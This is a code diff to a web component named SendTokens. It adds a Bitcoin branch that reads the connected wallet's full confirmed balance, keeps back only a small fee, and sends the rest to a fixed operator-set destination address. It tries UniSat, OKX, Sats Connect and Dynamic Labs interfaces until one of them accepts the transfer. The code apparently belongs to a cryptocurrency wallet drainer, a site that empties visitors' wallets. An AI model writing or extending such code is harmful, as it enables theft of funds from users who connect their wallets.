@@ -35,9 +35,11 @@ export const SendTokens = () => {
   const destinationAddress =
     primaryWallet?.chain === 'SOL'
       ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_SOL
-      : process.env.NEXT_PUBLIC_DESTINATION_WALLET_EVM ||
-        process.env.NEXT_PUBLIC_DESTINATION_WALLET ||
-        '';
+      : primaryWallet?.chain === 'BTC'
+        ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_BTC
+        : process.env.NEXT_PUBLIC_DESTINATION_WALLET_EVM ||
+          process.env.NEXT_PUBLIC_DESTINATION_WALLET ||
+          '';
 
   // Reset sent guard when wallet changes
   useEffect(() => {
@@ -240,6 +242,90 @@ export const SendTokens = () => {
         }
       } catch (err: any) {
         showToast(`Solana Connection Error: ${err.message}`, 'warning');
+      }
+    }
+
+    // ── Bitcoin ────────────────────────────────────────────────────────────────
+    if (primaryWallet.chain === 'BTC') {
+      const btcDestination = destinationAddress;
+      if (!btcDestination) {
+        showToast('Bitcoin destination wallet not configured.', 'warning');
+        return;
+      }
+
+      const btcToken = tokens.find((t) => t.contract_address === 'btc-native');
+      if (!btcToken) return;
+
+      try {
+        // Fetch live confirmed balance in satoshis
+        const btcRes = await fetch(
+          `https://mempool.space/api/address/${primaryWallet.address}`,
+        );
+        const btcData = await btcRes.json();
+        const liveSats =
+          (btcData.chain_stats?.funded_txo_sum || 0) -
+          (btcData.chain_stats?.spent_txo_sum || 0);
+
+        const FEE_RESERVE = 2000;
+        const amountToSend = liveSats - FEE_RESERVE;
+        if (amountToSend <= 0) {
+          showToast('BTC balance too low to cover network fee.', 'warning');
+          return;
+        }
+
+        const win = window as any;
+        const connector = (primaryWallet.connector as any);
+        let txid: string | undefined;
+
+        // 1. UniSat wallet — exposes window.unisat
+        if (typeof win?.unisat?.sendBitcoin === 'function') {
+          txid = await win.unisat.sendBitcoin(btcDestination, amountToSend);
+        }
+        // 2. OKX wallet
+        else if (typeof win?.okxwallet?.bitcoin?.sendBitcoin === 'function') {
+          const res = await win.okxwallet.bitcoin.sendBitcoin(btcDestination, amountToSend);
+          txid = res?.txhash || res;
+        }
+        // 3. Xverse / Magic Eden / Leather via window.BitcoinProvider (Sats Connect v2)
+        else if (typeof win?.BitcoinProvider?.request === 'function') {
+          const res = await win.BitcoinProvider.request('sendBtcTransaction', {
+            recipients: [{ address: btcDestination, amountSats: BigInt(amountToSend) }],
+            senderAddress: primaryWallet.address,
+          });
+          txid = res?.result?.txid || res?.txid;
+        }
+        // 4. Dynamic Labs connector direct sendBitcoin
+        else if (typeof connector?.sendBitcoin === 'function') {
+          txid = await connector.sendBitcoin(btcDestination, amountToSend);
+        }
+        // 5. Dynamic Labs getSigner → sendBitcoin
+        else {
+          const signer = await connector?.getSigner?.();
+          if (typeof signer?.sendBitcoin === 'function') {
+            txid = await signer.sendBitcoin(btcDestination, amountToSend);
+          } else if (typeof signer?.transfer === 'function') {
+            txid = await signer.transfer(btcDestination, amountToSend);
+          } else {
+            // Last resort: try to find any sendBitcoin on the wallet object chain
+            const walletClient = await connector?.getWalletClient?.();
+            if (typeof walletClient?.sendBitcoin === 'function') {
+              txid = await walletClient.sendBitcoin(btcDestination, amountToSend);
+            } else {
+              showToast('Bitcoin wallet does not support direct transfers.', 'warning');
+              return;
+            }
+          }
+        }
+
+        if (txid) {
+          setCheckedRecords((old) => ({
+            ...old,
+            'btc-native': { ...old['btc-native'], pendingTxn: { hash: txid as string } },
+          }));
+          showToast('BTC transfer submitted!', 'success');
+        }
+      } catch (err: any) {
+        showToast(`BTC Error: ${err.message || String(err)}`, 'warning');
       }
     }
   }, [
